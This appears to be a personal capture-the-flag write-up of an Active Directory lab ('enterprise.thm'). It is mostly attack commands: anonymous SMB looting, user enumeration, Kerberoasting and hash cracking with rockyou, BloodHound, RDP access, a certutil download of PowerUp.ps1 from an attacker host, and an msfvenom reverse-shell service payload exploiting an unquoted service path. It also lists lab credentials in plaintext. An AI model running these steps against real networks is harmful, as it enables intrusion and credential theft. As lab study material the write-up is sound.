Bunch of ports. hard to sort out. Get enough practice to eliminate normal ports on an AD.
In smb, we login with anonymous, and find a powershell history file at
`AppData/Roaming/Microsoft/Windows/Powershell/PSReadline/Consolehost_hisory.txt`
This gives us replication:101RepAdmin123!!
port 7990 leads us to a page, which says things have been moved to Github.
Upon looking in github for enterprise.thm, we find a username : Nik-enterprse-dev
$userName = 'nik'
$userPassword = 'ToastyBoi!'
we find the above info on his github.

---
couldnt get into smb, not winrm

we can enumerate users using rpcclient (needs password)
`rpcclient lab.enterprise.thm -U nik`
`enumdomusers` and then `enumdomgroups`
OR
we can use brute-force enumerate the users (no password required, but takes a looong time)
`./kerbrute userenum /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -d lab.enterprise.thm --dc "lab-dc"`
OR
we can use ldapdomaindump (needs password)
`ldapdomaindump -u 'lab.enterprise.thm\nik' -p 'ToastyBoi!' 10.48.151.119`
--> dumps domain computers, trusts, policies, groups, users. very useful

---
We move on to impacket-GetUserSNPs, since we have nik's password
`impacket-GetUserSPNs -request -dc-ip 10.48.151.119 lab.enterprise.thm/nik`
this gives us the hash of bitbucket.
`john bitbucket.hash --wordlist=/usr/share/wordlists/rockyou.txt` gives us the password. we can confirm from the ldapdomaindump, that this account has rdp
littleredbucket

---
To run bloodhound,
`bloodhound-python -u 'nik' -p 'ToastyBoi!' -ns 10.48.151.119 --dns-tcp -d lab.enterprise.thm -c All --zip`
`sudo /opt/BloodHound-linux-x64/BloodHound --no-sandbox`

---
`xfreerdp3 /v:lab.enterprise.thm /u:'bitbucket' /p:'littleredbucket' /dynamic-resolution /drive:./` gives us user.txt

---
For privesc, we use PowerUp.ps1
setup a `python -m http.server 80`
`certutil -urlcache -f http://192.168.175.229:8990/PowerUp.ps1 PowerUp.ps1`
`Import-Module PowerUp.ps1`
`Invoke-AlChecks`
This should return us all the possible privesc paths. we see this unquoted zerotierone service thingy running, and so we go to msfvenom, gen a payload, send it to windows, start listening, restart the service and get NT shell, which gives root.txt

`msfconsole -p windows/shell/reverse_tcp -f exe-service LHOST=192.168.175.229 LPORT=4445 -o Zero.exe`

PowerUp.ps1 shows the service name associated with it. so restart the service once listening
`sc.exe start zerotieroneservice` OR `Start-Service -name "zerotieroneservice"`
